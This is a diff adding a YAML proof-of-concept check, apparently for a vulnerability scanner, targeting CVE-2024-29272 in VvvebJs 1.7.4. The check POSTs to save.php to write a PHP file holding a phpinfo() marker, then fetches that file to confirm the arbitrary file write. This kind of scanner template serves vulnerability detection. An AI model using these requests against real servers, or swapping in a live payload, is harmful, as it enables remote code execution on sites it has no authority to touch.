@@ -1,0 +1,25 @@
+id: poc-yaml-vvvebjs-sava-any-write
+info:
+  name: VvvebJs 1.7.4 存在任意文件上传漏洞 (CVE-2024-29272)
+  severity: critical
+  tags:
+  - 文件上传
+  - CVE-2024-29272
+  finger: VvvebJs
+  fofa: null
+variables:
+  filename: to_lower(random_str(10))
+requests:
+- method: POST
+  path: /save.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: 'file=demo%2Flanding%2F{{.filename}}.php&html=<?php%20phpinfo();%20?>
+
+    '
+  expression: "status_code == 200 && \ncontains(body,\"File saved\")\n"
+- method: GET
+  path: /demo/landing/{{.filename}}.php
+  expression: "status_code == 200 && \ncontains(body,\"phpinfo\") &&\ncontains(body,\"\
+    PHP Version\")\n"
+transport: http
